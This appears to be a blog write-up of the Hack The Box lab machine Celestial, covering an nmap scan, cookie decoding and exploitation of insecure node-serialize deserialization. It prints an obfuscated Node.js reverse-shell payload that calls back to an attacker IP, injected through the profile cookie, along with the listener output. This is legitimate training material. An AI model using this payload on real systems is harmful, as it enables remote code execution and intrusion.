<!DOCTYPE html>
<html lang="en">

  <head>

    <!-- Non social metatags -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="theme-color" content="#157878">

    

    <title>Htb Celestial</title>

    
      <!-- Update your html tag to include the itemscope and itemtype attributes. -->
<html itemscope itemtype="http://schema.org/Article">












<!-- Place this data between the <head> tags of your website -->

  <meta name="author" content="Srb_">

<meta name="description" content="" />




  <meta name="keywords" itemprop="category" content="">


<!-- Schema.org markup for Google+ -->
<meta itemprop="name" content="Htb Celestial">
<meta itemprop="description" content="">

  <meta itemprop="image" content="http://localhost:4000/">


<!-- Twitter Card data -->
<meta name="twitter:card" content="summary_large_image">



<meta name="twitter:title" content="Htb Celestial">
<meta name="twitter:description" content="">


  <meta name="twitter:creator" content="@srb01246810">


<!-- Twitter summary card with large image must be at least 280x150px -->

  <meta name="twitter:image:src" content="http://localhost:4000/">
  <meta property="twitter:image" content="http://localhost:4000/">

<meta property="twitter:url" content="http://localhost:4000//offsec/2018/09/24/HTB-celestial.html">

<!-- Open Graph data -->
<meta property="og:title" content="Htb Celestial" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:4000//offsec/2018/09/24/HTB-celestial.html" />

  <meta property="og:image" content="http://localhost:4000/" />

<meta property="og:description" content="" />
<meta property="og:site_name" content="Home" />

  <meta property="article:published_time" content="2018-09-24T00:00:00-04:00" />














  





  
    <meta property="article:tag" content="offsec">
  



  <meta property="article:tag" content="">


    

    <link rel="canonical" href="http://localhost:4000/offsec/2018/09/24/HTB-celestial.html">

    

    <link rel="shortcut icon" href="http://localhost:4000/favicon.ico">
    <meta name="robots" content="noarchive">

    <!-- <link rel="alternate" media="only screen and (max-width: 640px)" href="">
    <link rel="alternate" media="handheld" href=""> -->


    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" href="/assets/css/style.css?v=">
  </head>
  <body>

    <header class="site-header" role="banner">

  <div class="wrapper">
    
    

    
      <a class="site-title" href="/">Home</a>
    

    
      <nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
              <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
              <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger">
          
            
            
              
              
            
          
            
            
              
                <a class="page-link" href="/dev.html">Dev</a>
              
            
          
            
            
          
            
            
              
                <a class="page-link" href="/offSec.html">OffSec</a>
              
            
          
            
            
          
        </div>
      </nav>
    
  </div>
</header>

    
    
    

    
    <div style="padding-top: 10%; text-align: center">
      <h1 class="project-name">Htb Celestial</h1>
      <h2 class="project-tagline"></h2>
    </div>
    

    <section class="main-content">

      <div>

  <p><img src="/assets/images/celestial.png" alt="banner" /></p>

<h1 id="celestial-10101085">Celestial: 10.10.10.85</h1>

<h2 id="scanning">Scanning</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p</span> 1-65535 <span class="nt">-sV</span> <span class="nt">-sS</span> <span class="nt">-T4</span> 10.10.10.85
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>srbz: 

Starting Nmap 7.01 <span class="o">(</span> https://nmap.org  <span class="o">)</span> at 2018-08-01 19:58 EDT
Warning: 10.10.10.85 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span><span class="nb">.</span>
Stats: 0:51:53 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% <span class="k">done</span><span class="p">;</span> ETC: 20:50 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.85
Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65491 closed ports, 43 filtered ports
PORT     STATE SERVICE VERSION

3000/tcp open  http    Node.js Express framework

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>3395.61 seconds
</code></pre></div></div>

<h4 id="burp">Burp</h4>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /favicon.ico HTTP/1.1

Host: 10.10.10.85:3000

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0

Accept: */*

Accept-Language: en-GB,en;q=0.5

Accept-Encoding: gzip, deflate

Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D

Connection: close

</code></pre></div></div>

<p>Since this is HTTP, letâ€™s try to decode the Cookie.profile as URL then Base64.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"username"</span>:<span class="s2">"Dummy"</span>,<span class="s2">"country"</span>:<span class="s2">"Idk Probably Somewhere Dumb"</span>,<span class="s2">"city"</span>:<span class="s2">"Lametown"</span>,<span class="s2">"num"</span>:<span class="s2">"2"</span><span class="o">}</span>
</code></pre></div></div>

<h2 id="gaining-access">Gaining Access</h2>

<p>Untrusted data passed into unserialize() function  in node-serialize module can be exploited to achieve arbitrary code execution by passing a serialized JavaScript Object with an Immediately invoked function expression (IIFE).</p>

<p>Pseudo code Server.js</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'cookie-parser'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">escape</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'escape-html'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'node-serialize'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">())</span>
 
<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">profile</span><span class="p">)</span> <span class="p">{</span>
   <span class="kd">var</span> <span class="nx">str</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Buffer</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">profile</span><span class="p">,</span> <span class="s1">'base64'</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
   <span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">.</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="nx">obj</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span><span class="p">)</span> <span class="p">{</span>
	 <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"Hey "</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span> <span class="o">&amp;</span> <span class="s2">" + "</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span> <span class="o">&amp;</span> <span class="s2">" = "</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span><span class="p">)</span> 
   <span class="p">}</span>
 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	 <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s1">'profile'</span><span class="p">,</span> <span class="s1">'eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D'</span><span class="p">,</span> <span class="p">{</span>
       <span class="na">maxAge</span><span class="p">:</span> <span class="mi">900000</span><span class="p">,</span>
       <span class="na">httpOnly</span><span class="p">:</span> <span class="kc">true</span>
     <span class="p">});</span>
 <span class="p">}</span>
<span class="p">});</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">);</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p nodejsshell.py 10.10.15.172 1337
<span class="o">[</span>+] LHOST <span class="o">=</span> 10.10.15.172
<span class="o">[</span>+] LPORT <span class="o">=</span> 1337
<span class="o">[</span>+] Encoding
<span class="nb">eval</span><span class="o">(</span>String.fromCharCode<span class="o">(</span>10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,49,55,50,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10<span class="o">))</span>
</code></pre></div></div>

<p>We can use JavaScriptâ€™s Immediately invoked function expression (IIFE) for calling the function. If we use IIFE bracket ()after the function body, the function will get invoked when the object is created. It works similar to a Class constructor in C++.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"username"</span>:<span class="s2">"_</span><span class="nv">$$</span><span class="s2">ND_FUNC</span><span class="nv">$$</span><span class="s2">_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,49,55,50,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"</span><span class="o">}</span>
</code></pre></div></div>

<p>Bv Using burpSuite, it is easy to edit the HTTP req in a way to encode and inject this payload ;) Juste make sure to encode as Base64 and URL. You can use hot keys <code class="highlighter-rouge">CTRL+B</code> and <code class="highlighter-rouge">CTRL+U</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1

Host: 10.10.10.85:3000

User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Ubuntu<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:61.0<span class="o">)</span> Gecko/20100101 Firefox/61.0

Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8

Accept-Language: en-GB,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5

Accept-Encoding: <span class="nb">gzip</span>, deflate

Cookie: <span class="nv">profile</span><span class="o">={</span><span class="s2">"username"</span>:<span class="s2">"_</span><span class="nv">$$</span><span class="s2">ND_FUNC</span><span class="nv">$$</span><span class="s2">_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,49,55,50,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"</span><span class="o">}</span>

Connection: close

Upgrade-Insecure-Requests: 1
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> 10.10.15.172 <span class="nt">-p</span> 1337

Connected!
</code></pre></div></div>

<h2 id="maintaining-access">Maintaining Access</h2>

<p>N/A</p>

<h2 id="covering-tasks">Covering Tasks</h2>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
<span class="n">total</span> <span class="mi">152</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">21</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">46</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>     <span class="mi">1</span> <span class="n">Mar</span>  <span class="mi">4</span> <span class="mi">15</span><span class="p">:</span><span class="mi">24</span> <span class="o">.</span><span class="n">bash_history</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>   <span class="mi">220</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">bash_logout</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">3771</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">bashrc</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">13</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Nov</span>  <span class="mi">8</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">cache</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">16</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">20</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">config</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">21</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">dbus</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Desktop</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">25</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">dmrc</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Mar</span>  <span class="mi">4</span> <span class="mi">15</span><span class="p">:</span><span class="mi">08</span> <span class="n">Documents</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Downloads</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">8980</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">examples</span><span class="o">.</span><span class="n">desktop</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">21</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">gconf</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">3</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">45</span> <span class="o">.</span><span class="n">gnupg</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">21</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">gvfs</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">6732</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">46</span> <span class="o">.</span><span class="n">ICEauthority</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">3</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">local</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">4</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">mozilla</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Music</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">nano</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">47</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">node_modules</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">20</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">node_repl_history</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">57</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">npm</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">21</span> <span class="n">Mar</span>  <span class="mi">4</span> <span class="mi">15</span><span class="p">:</span><span class="mi">40</span> <span class="n">output</span><span class="o">.</span><span class="n">txt</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Pictures</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>   <span class="mi">655</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">profile</span>
